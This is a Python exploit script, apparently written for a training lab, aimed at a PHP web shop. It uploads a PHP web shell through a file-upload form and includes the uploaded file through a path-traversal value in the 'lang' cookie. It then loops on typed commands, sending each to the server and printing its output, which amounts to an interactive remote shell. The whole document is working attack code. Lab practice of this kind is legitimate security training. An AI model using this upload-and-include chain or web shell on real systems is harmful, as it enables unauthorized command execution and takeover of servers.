import requests

#--------------------------------------------inject code
url = "http://magazin.cyberjutsu-lab.tech:8091/"
cookies = {"lang": "en.html", "PHPSESSID": "5d20272073227db6b3757cb0c1078e83"}
headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": "http://magazin.cyberjutsu-lab.tech:8091", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary1C2xixkhgUWEYab3", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://magazin.cyberjutsu-lab.tech:8091/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

filename="abc.txt"
comment="abc"
payload="<?php echo shell_exec($_GET['cmd']);?>"

data = "------WebKitFormBoundary1C2xixkhgUWEYab3\r\nContent-Disposition: form-data; name=\"comment\"\r\n\r\n{}\r\n------WebKitFormBoundary1C2xixkhgUWEYab3\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{}\"\r\nContent-Type: text/plain\r\n\r\n{}\r\n------WebKitFormBoundary1C2xixkhgUWEYab3--\r\n".format(comment,filename,payload)
data=requests.post(url, headers=headers, cookies=cookies, data=data)
data=data.text.split('<a href="')[-1]
data=data.split('"')[0]
#print(data)
#-------------------------------------------path traversal ---> file
path_traversal="../"+data
cookies = {"lang": path_traversal, "PHPSESSID": "5d20272073227db6b3757cb0c1078e83"}
headers = {"sec-ch-ua": "\"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

while 1:    
    url = "http://magazin.cyberjutsu-lab.tech:8091/?cmd={}".format(input("Type Command: "))
    data=requests.get(url, headers=headers, cookies=cookies)
    data=data.text.split("<body>")[1]
    data=data.split("<div")[0]
    print(data)